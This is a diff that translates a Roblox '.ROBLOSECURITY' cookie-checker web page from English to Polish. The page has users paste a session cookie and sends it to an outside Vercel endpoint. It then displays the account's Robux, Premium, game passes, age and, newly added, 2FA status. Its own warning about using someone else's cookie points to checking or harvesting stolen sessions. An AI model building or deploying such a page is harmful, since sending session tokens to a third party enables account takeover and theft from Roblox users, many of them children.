@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="pl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -15,18 +15,15 @@
   </style>
 </head>
 <body>
-
-<h2>Get Roblox account details using .ROBLOSECURITY cookie</h2>
+<h2>Sprawdź informacje o koncie Roblox (.ROBLOSECURITY)</h2>
 
 <p style="color:#ffcc00; font-weight:bold;">
-  <strong>WARNING:</strong> Using someone else's cookie violates Roblox ToS and may result in a permanent account ban
+  <strong>UWAGA:</strong> Używanie cudzego cookie jest niezgodne z regulaminem Roblox i może skutkować permanentnym banem konta.
 </p>
 
-<textarea id="cookie" placeholder="Paste your .ROBLOSECURITY value here (without '.ROBLOSECURITY=')"></textarea>
-
+<textarea id="cookie" placeholder="Wklej samą wartość .ROBLOSECURITY (bez '.ROBLOSECURITY=')"></textarea>
 <br>
-
-<button onclick="checkAccount()">Check Account</button>
+<button onclick="checkAccount()">Sprawdź konto</button>
 
 <div id="result"></div>
 
@@ -37,14 +34,14 @@ async function checkAccount() {
   result.innerHTML = '';
 
   if (cookieVal.length < 200) {
-    result.innerHTML = '<span class="error">Cookie appears to be too short / invalid</span>';
+    result.innerHTML = '<span class="error">Cookie jest za krótkie / wygląda na nieprawidłowe</span>';
     return;
   }
 
-  result.innerHTML = '<i>Checking account... please wait</i>';
+  result.innerHTML = '<i>Sprawdzam konto... chwilę</i>';
 
   try {
-    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {
+    const resp = await fetch('https://checker-alpha-pink.vercel.app/api/get-username', {   // ← zmień URL jeśli hostujesz gdzie indziej
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ cookie: cookieVal })
@@ -53,56 +50,58 @@ async function checkAccount() {
     const json = await resp.json();
 
     if (json.error) {
-      result.innerHTML = `<span class="error">Error: ${json.error}</span>`;
+      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
       return;
     }
 
     if (json.success) {
       const creationDate = json.created !== 'failed to fetch'
-        ? new Date(json.created).toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })
+        ? new Date(json.created).toLocaleDateString('pl-PL', { month: 'long', day: 'numeric', year: 'numeric' })
         : '—';
 
       let avatarHtml = json.avatarUrl
-        ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=No+Avatar';">`
-        : '<p style="color:#ffcc00;">Could not load avatar</p>';
+        ? `<img id="avatar" src="${json.avatarUrl}" alt="Avatar" onerror="this.src='https://via.placeholder.com/720?text=Brak+Avatara';">`
+        : '<p style="color:#ffcc00;">Nie udało się załadować avatara</p>';
 
-      // MM2
+      // Gamepasy
       const mm2Passes = [429957, 1308795];
       let mm2Count = mm2Passes.filter(id => json.hasGamePasses?.includes(id)).length;
       const mm2Color = mm2Count > 0 ? '#00ff9d' : '#ff4d4d';
 
-      // AMP
       const ampPasses = [189425850, 951065968, 951441773, 6408694, 60406961585546290, 7124470, 6965379, 3196348, 5300198];
       let ampCount = ampPasses.filter(id => json.hasGamePasses?.includes(id)).length;
       const ampColor = ampCount > 0 ? '#00ff9d' : '#ff4d4d';
 
-      // SAB (nowość)
       const sabPasses = [1227013099, 1229510262, 1228591447];
       let sabCount = sabPasses.filter(id => json.hasGamePasses?.includes(id)).length;
       const sabColor = sabCount > 0 ? '#00ff9d' : '#ff4d4d';
 
       result.innerHTML = `
-        <span class="success">Account successfully verified!</span><br><br>
+        <span class="success">Konto zweryfikowane pomyślnie!</span><br><br>
         ${avatarHtml}
         <b>Username:</b> ${json.username}<br>
         <b>Display Name:</b> ${json.displayName}<br>
         <b>User ID:</b> ${json.userId}<br>
-        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
-        <b>Robux balance:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('en-US')} Robux</span><br>
+        <b>Roblox Premium:</b> <span style="color: ${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">${json.hasPremium ? 'TAK ✓' : 'NIE ✗'}</span><br>
         
-        <b>MM2:</b> <span style="color: ${mm2Color}; font-weight: bold;">${mm2Count}</span><br>
-        <b>AMP:</b> <span style="color: ${ampColor}; font-weight: bold;">${ampCount}</span><br>
-        <b>SAB:</b> <span style="color: ${sabColor}; font-weight: bold;">${sabCount}</span><br>
+        <b>2FA (Two-Step Verification):</b> <span style="color: ${json.has2FA ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
+          ${json.has2FA ? 'WŁĄCZONE ✓' : 'WYŁĄCZONE ✗'}
+        </span><br>
         
-        <b>Account age:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} days</span><br>
-        <b>Created on:</b> ${creationDate} ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
+        <b>Robux:</b> <span style="color: #ffcc00; font-weight: bold;">${json.robux.toLocaleString('pl-PL')} Robux</span><br>
+        
+        <b>MM2 gamepasy:</b> <span style="color: ${mm2Color}; font-weight: bold;">${mm2Count}</span><br>
+        <b>AMP gamepasy:</b> <span style="color: ${ampColor}; font-weight: bold;">${ampCount}</span><br>
+        <b>SAB gamepasy:</b> <span style="color: ${sabColor}; font-weight: bold;">${sabCount}</span><br>
+        
+        <b>Wiek konta:</b> <span style="color: #ffcc00; font-weight: bold;">${json.accountAgeDays} dni</span><br>
+        <b>Utworzone:</b> ${creationDate} ${json.created !== 'failed to fetch' ? `<small>(${json.created.split('T')[0]})</small>` : ''}<br>
       `;
     }
   } catch (e) {
-    result.innerHTML = `<span class="error">Connection error: ${e.message}</span>`;
+    result.innerHTML = `<span class="error">Błąd połączenia: ${e.message}</span>`;
   }
 }
 </script>
-
 </body>
 </html>
